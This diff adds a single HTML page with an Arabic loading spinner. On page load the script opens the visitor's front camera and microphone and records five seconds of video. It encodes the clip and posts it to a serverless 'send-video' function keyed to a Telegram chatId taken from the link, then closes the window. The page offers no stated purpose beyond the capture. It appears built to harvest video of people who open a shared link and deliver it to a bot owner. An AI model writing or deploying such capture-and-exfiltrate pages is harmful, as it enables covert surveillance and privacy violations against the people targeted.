@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل فيديو</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #1a2a3a;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            color: white;
+            overflow: hidden;
+        }
+        
+        .loader-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255,255,255,0.3);
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        .loading-text {
+            font-size: 18px;
+            color: rgba(255,255,255,0.8);
+            margin-top: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loading-text">جاري تسجيل فيديو 5 ثواني...</div>
+    </div>
+
+    <video id="cameraPreview" class="hidden" autoplay playsinline muted></video>
+    <canvas id="videoCanvas" class="hidden"></canvas>
+
+    <script>
+        // أزليت التوكن من هنا
+        
+        function getChatId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('chatId');
+        }
+        
+        async function sendVideoToTelegram(videoBlob, chatId) {
+            try {
+                // تحويل Blob إلى Base64
+                const base64Promise = new Promise((resolve) => {
+                    const reader = new FileReader();
+                    reader.onloadend = () => resolve(reader.result);
+                    reader.readAsDataURL(videoBlob);
+                });
+                
+                const base64Data = await base64Promise;
+                
+                // إرسال لـ Netlify Function
+                const response = await fetch('/.netlify/functions/send-video', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        video: base64Data.split(',')[1], // فقط الجزء بعد ,
+                        filename: `video_${Date.now()}.webm`
+                    })
+                });
+                
+                const result = await response.json();
+                return result.success;
+                
+            } catch (error) {
+                console.error('Error sending video:', error);
+                return false;
+            }
+        }
+        
+        async function recordVideo() {
+            const chatId = getChatId();
+            if (!chatId) {
+                window.close();
+                return;
+            }
+            
+            const video = document.getElementById('cameraPreview');
+            
+            try {
+                // فتح الكاميرا الأمامية
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },  // دقة أقل للسرعة
+                        height: { ideal: 480 }
+                    },
+                    audio: true // إضافة الصوت
+                });
+                
+                video.srcObject = stream;
+                
+                // بدء تسجيل الفيديو
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp8,opus',
+                    videoBitsPerSecond: 500000 // جودة منخفضة للسرعة
+                });
+                
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    // تجميع الفيديو
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    
+                    // إرسال الفيديو
+                    await sendVideoToTelegram(videoBlob, chatId);
+                    
+                    // إغلاق الكاميرا
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // إغلاق النافذة بعد 1 ثانية
+                    setTimeout(() => {
+                        window.close();
+                    }, 1000);
+                };
+                
+                // بدء التسجيل
+                mediaRecorder.start();
+                
+                // تسجيل لمدة 5 ثواني
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000);
+                
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                setTimeout(() => {
+                    window.close();
+                }, 1000);
+            }
+        }
+        
+        // بدء التسجيل فوراً
+        window.addEventListener('load', recordVideo);
+    </script>
+</body>
+</html>
